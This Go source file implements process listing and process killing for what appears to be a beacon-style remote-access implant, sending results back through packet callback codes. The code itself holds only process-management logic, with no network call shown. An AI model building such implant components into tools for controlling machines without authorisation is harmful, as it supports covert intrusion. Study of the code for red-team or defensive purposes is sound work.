package command

import (
	"encoding/binary"
	"errors"
	"github.com/shirou/gopsutil/v3/process"
	"main/packet"
	"main/sysinfo"
	"main/util"
	"strconv"
)

func ListProcess(pendingRequest []byte) error {
	processes, _ := process.Processes()
	result := ""
	for _, p := range processes {
		pid := p.Pid
		parent, err := p.Parent()
		if err != nil {
			continue
		}
		pPid := parent.Pid
		name, _ := p.Name()
		owner, _ := p.Username()
		sessionId := sysinfo.GetProcessSessionId(pid)
		arch := sysinfo.GetProcessArch(uint32(pid))
		var archString string
		if arch == sysinfo.ProcessArch64 {
			archString = "x64"
		} else {
			archString = "x86"
		}

		result += util.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
	}
	// command line ps
	resultBytes := append(pendingRequest, []byte(result)...)
	if binary.BigEndian.Uint32(pendingRequest) == 0 {
		packet.PushResult(packet.CALLBACK_PROCESS_LIST, resultBytes)
	} else {
		packet.PushResult(packet.CALLBACK_PENDING, resultBytes)
	}
	return nil
}

func KillProcess(b []byte) error {
	pid := binary.BigEndian.Uint32(b)
	processes, err := process.Processes()
	if err != nil {
		return err
	}
	for _, p := range processes {
		if p.Pid == int32(pid) {
			err = p.Kill()
			if err != nil {
				return err
			}
			packet.PushResult(packet.CALLBACK_OUTPUT, []byte(util.Sprintf("kill process %d success", pid)))
			return nil
		}
	}
	return errors.New("process" + strconv.Itoa(int(pid)) + "not found")
}
